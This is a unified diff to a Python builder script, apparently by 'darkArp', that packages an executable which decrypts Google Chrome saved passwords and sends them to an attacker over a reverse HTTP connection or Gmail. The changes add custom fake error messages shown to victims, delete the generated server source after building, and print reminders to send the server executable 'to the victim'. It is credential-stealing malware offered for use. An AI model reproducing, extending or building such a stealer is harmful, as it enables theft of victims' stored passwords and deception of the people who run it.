@@ -1,18 +1,30 @@
 # -*- coding: utf-8 -*-
-# Created by darkArp. For more info check the instructions text file.
-# MarioNascimento@ITCrashSecurity.com
-# Contains test code to be cleaned up
+"""Creates an Executable that decrypts and sends Chrome passwords
 
-# To include custom icon, place the icon of choice in the same directory as
-# this script and rename it "icon.ico"
+This script will make use of py2exe to create an executable
+version of itself, after gathering the input from the user.
+The executable's functionality is to decrypt Google Chrome
+saved passwords and sending them as a text file to an attacker
+through reverce HTTP connection or email.
 
+Note: To include a custom icon, the 'icon.ico' file in the directory
+must be replaced by the desired one.
+"""
 import os
 import sys
 import time
+from distutils.core import setup
+from shutil import rmtree
 
 import py2exe
-from shutil import rmtree
-from distutils.core import setup
+from win32con import MB_OKCANCEL
+
+__author__ = "Mario Nascimento"
+__license__ = "GPL"
+__version__ = "4.0.0"
+__maintainer__ = "Mario Nascimento"
+__email__ = "marionascimento@itsec.us"
+__status__ = "Development"
 
 attacker_ip = ""
 loop = True
@@ -20,19 +32,17 @@ error = "0"
 email = ""
 pwd = ""
 mailto = ""
-serverlineStart = 196
-serverlineStop = 302
+serverlineStart = 211
+serverlineStop = 319
 
 while loop:
     os.system("cls")
     print(
-        """You are using V3.1.2
-    \n
-    Choose how you want the passwords delivered
-    (1) - via email (only Gmail supported, example@gmail.com.
-    Make sure you turn on 'allow less secure apps')
-    \n
-    (2) - via the client.exe (to your computer directly)
+        """You are using V3.1.2\n
+    Choose how you want the passwords delivered\n
+    (1) - [Buggy atm] via email (only Gmail supported, example@gmail.com.
+        (Make sure you turn on 'allow less secure apps')\n
+    (2) - via the client.exe (to your computer directly)\n
     """
     )
     option = input("\nChoose a number [1-2]: ")
@@ -42,7 +52,7 @@ while loop:
         pwd = input("Input your Gmail password: ")
         mailto = input(
             "Input the email you want to send the passwords to. \
-                Leave black to send it to yourself: "
+Leave black to send it to yourself: "
         )
         if not mailto:
             mailto = email
@@ -55,21 +65,23 @@ while loop:
     else:
         input(
             "You must choose a value between 1 and 2. \
-                Enter any key to try again.."
+Enter any key to try again.."
         )
 
 
 while not loop:
     error = input(
         "Do you want the server to \
-        display a fake Error message? [Y/N]: "
+display a fake Error message? [Y/N]: "
     )
     if error.lower() == "y" or error.lower() == "yes":
-        error = "1"
+        error = input("Enter a custom message or leave empty for default: ")
+        if error is None:
+            error = "1"
         os.system("cls")
         print(
-            "Well done!\nThe server will be created shortly. \
-            Don't close this window"
+            "Well done!\nThe server will be created shortly.\n\
+Don't close this window"
         )
         time.sleep(2)
         loop = True
@@ -78,24 +90,27 @@ while not loop:
         error = "0"
         os.system("cls")
         print(
-            "Well done!\nThe server will be created shortly. \
-            Don't close this window"
+            "Well done!\nThe server will be created shortly.\n\
+Don't close this window"
         )
         time.sleep(2)
         loop = True
     else:
         input(
             "You must choose either Y or N. \
-            Enter any key to try again.."
+Enter any key to try again.."
         )
 
 
 def done():
     os.system("cls")
     if option != "1":
-        print("Client has been created under name client.exe")
-    print(f"Server has been created under the name '{appname}+'.exe\n")
-    print("\nRemember: You send the '{appname}'.exe ' + 'to the victim!")
+        print(
+            "\nClient has been created as 'client.exe'\n"
+            + "Remember: Open this one before sending the server to the victim"
+        )
+    print(f"\nServer has been created as '{appname}'.exe")
+    print(f"Remember: You send the '{appname}'.exe to the victim!")
     input("Press Enter to continue...")
     exit()
 
@@ -171,7 +186,7 @@ option = '{option}'\n\
 email = '{email}'\n\
 pwd = '{pwd}'\n\
 mailto = '{mailto}'\n\
-error = '{error}'\n"
+error = u'{error}'\n"
         )
         while i < serverlineStop - 1:
             f2.write(lines[i])
@@ -187,7 +202,7 @@ error = '{error}'\n"
     time.sleep(3)
     py2crypt("server.py")
     try:
-        # os.remove("server.py")
+        os.remove("server.py")
         os.remove("client.py")
     except Exception as err:
         pass
@@ -294,11 +309,13 @@ try:
     os.remove(destination)
 except:
     check_call(["attrib","+H",destination])
+MB_OK = 0x00
+MB_ICONSTOP = 0x10
 if error == "1":
-    MB_OK = 0x00
-    MB_ICONSTOP = 0x10
     ctypes.windll.user32.MessageBoxW(
         None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
+if error != "1" and error != "0":
+    ctypes.windll.user32.MessageBoxW(None, error, u'Error', MB_OK | MB_ICONSTOP)
 import os, queue, requests
 import cgi
 import http.server
